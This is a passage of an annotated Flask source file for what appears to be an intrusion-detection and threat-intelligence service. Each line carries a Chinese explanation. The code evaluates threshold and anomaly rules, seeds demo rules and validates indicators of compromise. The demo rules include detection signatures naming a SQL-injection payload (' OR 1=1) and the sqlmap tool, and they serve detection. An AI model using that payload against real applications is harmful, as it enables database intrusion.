| 2765 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        ops = {` |
| 2766 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            ">": left > right,` |
| 2767 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            ">=": left >= right,` |
| 2768 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "<": left < right,` |
| 2769 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "<=": left <= right,` |
| 2770 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "==": left == right,` |
| 2771 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "!=": left != right,` |
| 2772 | 代码语句：参与当前文件的业务流程或数据处理。 | `        }` |
| 2773 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        matched = bool(ops.get(op))` |
| 2774 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        reason = (` |
| 2775 | 代码语句：参与当前文件的业务流程或数据处理。 | `            f"实测 {key}={left} {op} {right} → {'命中' if matched else '未命中'}"` |
| 2776 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 2777 | 条件分支：前面条件不满足时继续判断。 | `    elif rule_type == "anomaly":` |
| 2778 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        keys = [k.strip() for k in pattern.split(",") if k.strip()]` |
| 2779 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        missing = [k for k in keys if k not in features]` |
| 2780 | 条件判断：满足条件时进入对应分支。 | `        if missing:` |
| 2781 | 返回结果：把处理后的值交回调用方。 | `            return {` |
| 2782 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "matched": False,` |
| 2783 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "reason": f"sample.features 缺少特征：{missing}",` |
| 2784 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "rule_type": rule_type,` |
| 2785 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "evaluated_at": _now_iso(),` |
| 2786 | 代码语句：参与当前文件的业务流程或数据处理。 | `            }` |
| 2787 | 注释：解释下面或当前这段代码的设计意图。 | `        # anomaly 示例判定：特征绝对值超出常识范围则命中；纯演示逻辑，Phase 8 替换为真实离群检测` |
| 2788 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        anomalies: List[str] = []` |
| 2789 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        bounds = {` |
| 2790 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "packets_per_sec": (0, 3000),` |
| 2791 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "avg_packet_size": (40, 1500),` |
| 2792 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "unique_ports": (0, 50),` |
| 2793 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "failed_ratio": (0.0, 0.6),` |
| 2794 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "payload_entropy": (0.0, 6.5),` |
| 2795 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "confidence": (0.0, 1.0),` |
| 2796 | 代码语句：参与当前文件的业务流程或数据处理。 | `        }` |
| 2797 | 循环：逐个处理集合或迭代器中的元素。 | `        for k in keys:` |
| 2798 | 函数调用：执行已有函数/方法完成当前步骤。 | `            lo, hi = bounds.get(k, (float("-inf"), float("inf")))` |
| 2799 | 异常保护：尝试执行可能失败的逻辑。 | `            try:` |
| 2800 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                v = float(features[k])` |
| 2801 | 异常处理：捕获错误并执行降级或记录逻辑。 | `            except (TypeError, ValueError):` |
| 2802 | 继续循环：跳过本轮剩余逻辑。 | `                continue` |
| 2803 | 条件判断：满足条件时进入对应分支。 | `            if v < lo or v > hi:` |
| 2804 | 函数调用：执行已有函数/方法完成当前步骤。 | `                anomalies.append(f"{k}={v} 超出 [{lo}, {hi}]")` |
| 2805 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        matched = bool(anomalies)` |
| 2806 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        reason = "；".join(anomalies) if matched else "所有特征在常识范围内"` |
| 2807 | 兜底分支：处理前面条件都不满足的情况。 | `    else:` |
| 2808 | 返回结果：把处理后的值交回调用方。 | `        return {` |
| 2809 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "matched": False,` |
| 2810 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "reason": f"未知规则类型 {rule_type}",` |
| 2811 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "rule_type": rule_type,` |
| 2812 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "evaluated_at": _now_iso(),` |
| 2813 | 代码语句：参与当前文件的业务流程或数据处理。 | `        }` |
| 2814 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2815 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    src = sample.get("src_ip")` |
| 2816 | 条件判断：满足条件时进入对应分支。 | `    if src and matched:` |
| 2817 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        reason = f"[src={src}] " + reason` |
| 2818 | 返回结果：把处理后的值交回调用方。 | `    return {` |
| 2819 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "matched": matched,` |
| 2820 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "reason": reason,` |
| 2821 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "rule_type": rule_type,` |
| 2822 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "evaluated_at": _now_iso(),` |
| 2823 | 代码语句：参与当前文件的业务流程或数据处理。 | `    }` |
| 2824 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2825 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2826 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `_DEMO_RULES: Tuple[Dict[str, Any], ...] = (` |
| 2827 | 代码语句：参与当前文件的业务流程或数据处理。 | `    {` |
| 2828 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "name": "SQLi 关键特征",` |
| 2829 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "type": "signature",` |
| 2830 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "pattern": "' OR 1=1",` |
| 2831 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "action": "block",` |
| 2832 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "level": "high",` |
| 2833 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "priority": 10,` |
| 2834 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "description": "检测请求体中的典型 SQL 布尔注入 Payload。",` |
| 2835 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "enabled": True,` |
| 2836 | 代码语句：参与当前文件的业务流程或数据处理。 | `    },` |
| 2837 | 代码语句：参与当前文件的业务流程或数据处理。 | `    {` |
| 2838 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "name": "可疑 User-Agent (sqlmap)",` |
| 2839 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "type": "signature",` |
| 2840 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "pattern": "/sqlmap\\/\\d+\\./",` |
| 2841 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "action": "alert",` |
| 2842 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "level": "medium",` |
| 2843 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "priority": 20,` |
| 2844 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "description": "自动化注入工具指纹。",` |
| 2845 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "enabled": True,` |
| 2846 | 代码语句：参与当前文件的业务流程或数据处理。 | `    },` |
| 2847 | 代码语句：参与当前文件的业务流程或数据处理。 | `    {` |
| 2848 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "name": "高速扫描来源",` |
| 2849 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "type": "threshold",` |
| 2850 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "pattern": "packets_per_sec > 1500",` |
| 2851 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "action": "block",` |
| 2852 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "level": "high",` |
| 2853 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "priority": 30,` |
| 2854 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "description": "单 IP 包速率超基线 3σ，疑似扫描或 DoS。",` |
| 2855 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "enabled": True,` |
| 2856 | 代码语句：参与当前文件的业务流程或数据处理。 | `    },` |
| 2857 | 代码语句：参与当前文件的业务流程或数据处理。 | `    {` |
| 2858 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "name": "失败率异常",` |
| 2859 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "type": "threshold",` |
| 2860 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "pattern": "failed_ratio >= 0.85",` |
| 2861 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "action": "alert",` |
| 2862 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "level": "medium",` |
| 2863 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "priority": 40,` |
| 2864 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "description": "短时失败率极高，疑似爆破。",` |
| 2865 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "enabled": True,` |
| 2866 | 代码语句：参与当前文件的业务流程或数据处理。 | `    },` |
| 2867 | 代码语句：参与当前文件的业务流程或数据处理。 | `    {` |
| 2868 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "name": "低置信度模型输出",` |
| 2869 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "type": "threshold",` |
| 2870 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "pattern": "confidence < 0.6",` |
| 2871 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "action": "monitor",` |
| 2872 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "level": "low",` |
| 2873 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "priority": 90,` |
| 2874 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "description": "模型置信度偏低，仅记录不阻断。",` |
| 2875 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "enabled": False,` |
| 2876 | 代码语句：参与当前文件的业务流程或数据处理。 | `    },` |
| 2877 | 代码语句：参与当前文件的业务流程或数据处理。 | `    {` |
| 2878 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "name": "多维度异常聚类",` |
| 2879 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "type": "anomaly",` |
| 2880 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "pattern": "packets_per_sec,unique_ports,failed_ratio",` |
| 2881 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "action": "alert",` |
| 2882 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "level": "critical",` |
| 2883 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "priority": 5,` |
| 2884 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "description": "多项特征同时偏离基线，严重告警。",` |
| 2885 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "enabled": True,` |
| 2886 | 代码语句：参与当前文件的业务流程或数据处理。 | `    },` |
| 2887 | 函数调用：执行已有函数/方法完成当前步骤。 | `)` |
| 2888 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2889 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2890 | 函数定义：声明 `_seed_demo_rules` 的输入、处理逻辑和返回结果。 | `def _seed_demo_rules(app: Flask) -> int:` |
| 2891 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    created = 0` |
| 2892 | 循环：逐个处理集合或迭代器中的元素。 | `    for tpl in _DEMO_RULES:` |
| 2893 | 函数调用：执行已有函数/方法完成当前步骤。 | `        norm, err = _validate_rule_payload(dict(tpl))` |
| 2894 | 条件判断：满足条件时进入对应分支。 | `        if err or not norm:` |
| 2895 | 日志记录：输出运行状态、调试信息或异常线索。 | `            logger.warning("[Rules] demo 规则校验失败：%s -> %s", tpl.get("name"), err)` |
| 2896 | 继续循环：跳过本轮剩余逻辑。 | `            continue` |
| 2897 | 函数调用：执行已有函数/方法完成当前步骤。 | `        _insert_rule_from_normalized(norm)` |
| 2898 | 代码语句：参与当前文件的业务流程或数据处理。 | `        created += 1` |
| 2899 | 返回结果：把处理后的值交回调用方。 | `    return created` |
| 2900 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2901 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2902 | 注释：解释下面或当前这段代码的设计意图。 | `# =====================================================================` |
| 2903 | 注释：解释下面或当前这段代码的设计意图。 | `# 威胁情报：校验 / provider 分发 / mock / seed` |
| 2904 | 注释：解释下面或当前这段代码的设计意图。 | `# =====================================================================` |
| 2905 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `_IOC_REASON_MAX: int = 200` |
| 2906 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `_IOC_NOTE_MAX: int = 400` |
| 2907 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `_IOC_SOURCE_MAX: int = 40` |
| 2908 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2909 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2910 | 函数定义：声明 `_is_valid_domain` 的输入、处理逻辑和返回结果。 | `def _is_valid_domain(value: str) -> bool:` |
| 2911 | 返回结果：把处理后的值交回调用方。 | `    return bool(value) and bool(_DOMAIN_RE.match(value))` |
| 2912 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2913 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2914 | 函数定义：声明 `_is_valid_url` 的输入、处理逻辑和返回结果。 | `def _is_valid_url(value: str) -> bool:` |
| 2915 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    v = (value or "").strip()` |
| 2916 | 返回结果：把处理后的值交回调用方。 | `    return len(v) <= 2048 and (v.startswith("http://") or v.startswith("https://"))` |
| 2917 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2918 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2919 | 函数定义：声明 `_is_valid_file_hash` 的输入、处理逻辑和返回结果。 | `def _is_valid_file_hash(value: str) -> bool:` |
| 2920 | 返回结果：把处理后的值交回调用方。 | `    return bool(_HASH_RE.match((value or "").strip()))` |
| 2921 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2922 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2923 | 函数定义：声明 `_is_valid_cve` 的输入、处理逻辑和返回结果。 | `def _is_valid_cve(value: str) -> bool:` |
| 2924 | 返回结果：把处理后的值交回调用方。 | `    return bool(_CVE_RE.match((value or "").strip()))` |
| 2925 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2926 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2927 | 函数定义：声明 `_canonical_ioc_value` 的输入、处理逻辑和返回结果。 | `def _canonical_ioc_value(ioc_type: str, value: str) -> str:` |
| 2928 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    t = ioc_type.lower().strip()` |
| 2929 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    v = value.strip()` |
| 2930 | 条件判断：满足条件时进入对应分支。 | `    if t == "domain":` |
| 2931 | 返回结果：把处理后的值交回调用方。 | `        return v.lower()` |
| 2932 | 条件判断：满足条件时进入对应分支。 | `    if t == "file_hash":` |
| 2933 | 返回结果：把处理后的值交回调用方。 | `        return v.lower()` |
| 2934 | 条件判断：满足条件时进入对应分支。 | `    if t == "cve":` |
| 2935 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        m = _CVE_RE.match(v)` |
| 2936 | 返回结果：把处理后的值交回调用方。 | `        return m.group(1).upper() if m else v.upper()` |
| 2937 | 返回结果：把处理后的值交回调用方。 | `    return v` |
| 2938 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2939 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2940 | 函数定义：声明 `_db_ioc_row_to_api_entry` 的输入、处理逻辑和返回结果。 | `def _db_ioc_row_to_api_entry(d: Dict[str, Any]) -> Dict[str, Any]:` |
| 2941 | 函数定义：声明 `_iso` 的输入、处理逻辑和返回结果。 | `    def _iso(x: Any) -> Optional[str]:` |
| 2942 | 条件判断：满足条件时进入对应分支。 | `        if x is None:` |
| 2943 | 返回结果：把处理后的值交回调用方。 | `            return None` |
| 2944 | 条件判断：满足条件时进入对应分支。 | `        if hasattr(x, "isoformat"):` |
| 2945 | 返回结果：把处理后的值交回调用方。 | `            return x.isoformat()` |
| 2946 | 返回结果：把处理后的值交回调用方。 | `        return str(x)` |
| 2947 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2948 | 返回结果：把处理后的值交回调用方。 | `    return {` |
| 2949 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "id": d["id"],` |
| 2950 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "type": d["ioc_type"],` |
| 2951 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "value": d["value"],` |
| 2952 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "sources": d.get("sources") or [],` |
| 2953 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "reason": d.get("reason") or "",` |
| 2954 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "note": d.get("note") or "",` |
| 2955 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "score": d.get("score"),` |
| 2956 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "ttl_seconds": d.get("ttl_seconds"),` |
| 2957 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "first_seen": _iso(d.get("first_seen")),` |
| 2958 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "last_seen": _iso(d.get("last_seen")),` |
| 2959 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "expires_at": _iso(d.get("expires_at")),` |
| 2960 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "metadata": d.get("metadata"),` |
| 2961 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "hits": d.get("hits", 0),` |
| 2962 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "added_at": _iso(d.get("added_at")),` |
| 2963 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "updated_at": _iso(d.get("updated_at")),` |
| 2964 | 代码语句：参与当前文件的业务流程或数据处理。 | `    }` |
| 2965 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2966 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2967 | 函数定义：声明 `_validate_ioc_payload` 的输入、处理逻辑和返回结果。 | `def _validate_ioc_payload(` |
| 2968 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    payload: Dict[str, Any],` |
| 2969 | 代码语句：参与当前文件的业务流程或数据处理。 | `) -> Tuple[Optional[Dict[str, Any]], Optional[str]]:` |
| 2970 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    ioc_type = str(payload.get("type", "")).strip()` |
| 2971 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    raw_value = str(payload.get("value", "")).strip()` |
| 2972 | 条件判断：满足条件时进入对应分支。 | `    if ioc_type not in IOC_TYPES:` |
| 2973 | 返回结果：把处理后的值交回调用方。 | `        return None, f"type 必须是 {list(IOC_TYPES)}"` |
| 2974 | 条件判断：满足条件时进入对应分支。 | `    if ioc_type == "ip":` |
| 2975 | 条件判断：满足条件时进入对应分支。 | `        if not validate_ip(raw_value):` |
| 2976 | 返回结果：把处理后的值交回调用方。 | `            return None, "无效的 IP 地址"` |
| 2977 | 条件分支：前面条件不满足时继续判断。 | `    elif ioc_type == "domain":` |
| 2978 | 条件判断：满足条件时进入对应分支。 | `        if not _is_valid_domain(raw_value):` |
| 2979 | 返回结果：把处理后的值交回调用方。 | `            return None, "无效的域名"` |
| 2980 | 条件分支：前面条件不满足时继续判断。 | `    elif ioc_type == "url":` |
| 2981 | 条件判断：满足条件时进入对应分支。 | `        if not _is_valid_url(raw_value):` |
| 2982 | 返回结果：把处理后的值交回调用方。 | `            return None, "无效的 URL（需 http/https，长度≤2048）"` |
| 2983 | 条件分支：前面条件不满足时继续判断。 | `    elif ioc_type == "file_hash":` |
| 2984 | 条件判断：满足条件时进入对应分支。 | `        if not _is_valid_file_hash(raw_value):` |
| 2985 | 返回结果：把处理后的值交回调用方。 | `            return None, "无效的文件哈希（32~128 位十六进制）"` |
| 2986 | 条件分支：前面条件不满足时继续判断。 | `    elif ioc_type == "cve":` |
| 2987 | 条件判断：满足条件时进入对应分支。 | `        if not _is_valid_cve(raw_value):` |
| 2988 | 返回结果：把处理后的值交回调用方。 | `            return None, "无效的 CVE 编号"` |
| 2989 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2990 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    value = _canonical_ioc_value(ioc_type, raw_value)` |
| 2991 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2992 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    source = str(payload.get("source", "manual")).strip() or "manual"` |
| 2993 | 条件判断：满足条件时进入对应分支。 | `    if len(source) > _IOC_SOURCE_MAX:` |
| 2994 | 返回结果：把处理后的值交回调用方。 | `        return None, f"source 长度不得超过 {_IOC_SOURCE_MAX}"` |
| 2995 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2996 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    reason = str(payload.get("reason", ""))` |
| 2997 | 条件判断：满足条件时进入对应分支。 | `    if len(reason) > _IOC_REASON_MAX:` |
| 2998 | 返回结果：把处理后的值交回调用方。 | `        return None, f"reason 长度不得超过 {_IOC_REASON_MAX}"` |
| 2999 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 3000 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    note = str(payload.get("note", ""))` |
| 3001 | 条件判断：满足条件时进入对应分支。 | `    if len(note) > _IOC_NOTE_MAX:` |
| 3002 | 返回结果：把处理后的值交回调用方。 | `        return None, f"note 长度不得超过 {_IOC_NOTE_MAX}"` |
| 3003 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 3004 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    score_raw = payload.get("score")` |
| 3005 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    score: Optional[int] = None` |
| 3006 | 条件判断：满足条件时进入对应分支。 | `    if score_raw not in (None, ""):` |
| 3007 | 异常保护：尝试执行可能失败的逻辑。 | `        try:` |
| 3008 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            score = int(score_raw)` |
| 3009 | 异常处理：捕获错误并执行降级或记录逻辑。 | `        except (TypeError, ValueError):` |
| 3010 | 返回结果：把处理后的值交回调用方。 | `            return None, "score 必须是整数"` |
| 3011 | 条件判断：满足条件时进入对应分支。 | `        if score < 0 or score > 100:` |
| 3012 | 返回结果：把处理后的值交回调用方。 | `            return None, "score 必须在 0~100"` |
| 3013 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 3014 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    ttl_raw = payload.get("ttl_seconds")` |
| 3015 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    ttl_seconds: Optional[int] = None` |
| 3016 | 条件判断：满足条件时进入对应分支。 | `    if ttl_raw not in (None, ""):` |
| 3017 | 异常保护：尝试执行可能失败的逻辑。 | `        try:` |
| 3018 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            ttl_seconds = int(ttl_raw)` |
| 3019 | 异常处理：捕获错误并执行降级或记录逻辑。 | `        except (TypeError, ValueError):` |
| 3020 | 返回结果：把处理后的值交回调用方。 | `            return None, "ttl_seconds 必须是整数"` |
| 3021 | 条件判断：满足条件时进入对应分支。 | `        if ttl_seconds < 0 or ttl_seconds > 86400 * 365 * 10:` |
| 3022 | 返回结果：把处理后的值交回调用方。 | `            return None, "ttl_seconds 超出合理范围"` |
| 3023 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 3024 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    meta = payload.get("metadata")` |
| 3025 | 条件判断：满足条件时进入对应分支。 | `    if meta is not None and not isinstance(meta, dict):` |
| 3026 | 返回结果：把处理后的值交回调用方。 | `        return None, "metadata 必须是 JSON 对象"` |
| 3027 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 3028 | 返回结果：把处理后的值交回调用方。 | `    return (` |
| 3029 | 代码语句：参与当前文件的业务流程或数据处理。 | `        {` |
| 3030 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "type": ioc_type,` |
| 3031 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "value": value,` |
| 3032 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "source": source,` |
| 3033 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "reason": reason,` |
| 3034 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "note": note,` |
| 3035 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "score": score,` |
| 3036 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "ttl_seconds": ttl_seconds,` |
| 3037 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "metadata": meta,` |
| 3038 | 代码语句：参与当前文件的业务流程或数据处理。 | `        },` |
| 3039 | 代码语句：参与当前文件的业务流程或数据处理。 | `        None,` |
| 3040 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 3041 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 3042 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 3043 | 函数定义：声明 `_threat_intel_mock_enabled` 的输入、处理逻辑和返回结果。 | `def _threat_intel_mock_enabled() -> bool:` |
| 3044 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    cfg = get_config()` |
| 3045 | 返回结果：把处理后的值交回调用方。 | `    return bool(getattr(cfg, "DEBUG", False)) or (` |
| 3046 | 函数调用：执行已有函数/方法完成当前步骤。 | `        os.environ.get("THREAT_INTEL_MOCK", "").lower() == "true"` |
| 3047 | 函数调用：执行已有函数/方法完成当前步骤。 | `    ) or (os.environ.get("ALLOW_DEV_SEED", "").lower() == "true")` |
| 3048 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 3049 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 3050 | 函数定义：声明 `_threat_intel_local_lookup` 的输入、处理逻辑和返回结果。 | `def _threat_intel_local_lookup(` |
| 3051 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    app: Flask, state: _ServerState, ioc_type: str, value: str` |
| 3052 | 代码语句：参与当前文件的业务流程或数据处理。 | `) -> Dict[str, Any]:` |
| 3053 | 异常保护：尝试执行可能失败的逻辑。 | `    try:` |
| 3054 | 导入对象：从指定模块引入类、函数或常量。 | `        from src.collectors.ioc_repository import IOCRepository` |
| 3055 | 导入对象：从指定模块引入类、函数或常量。 | `        from web.database import db` |
| 3056 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 3057 | 上下文管理：自动管理资源打开与释放。 | `        with app.app_context():` |
| 3058 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            row = IOCRepository(db.session).find_active_dict(ioc_type, value)` |
| 3059 | 条件判断：满足条件时进入对应分支。 | `        if row:` |
| 3060 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            exp = row.get("expires_at")` |
| 3061 | 返回结果：把处理后的值交回调用方。 | `            return {` |
| 3062 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "provider": "local",` |
| 3063 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "ok": True,` |
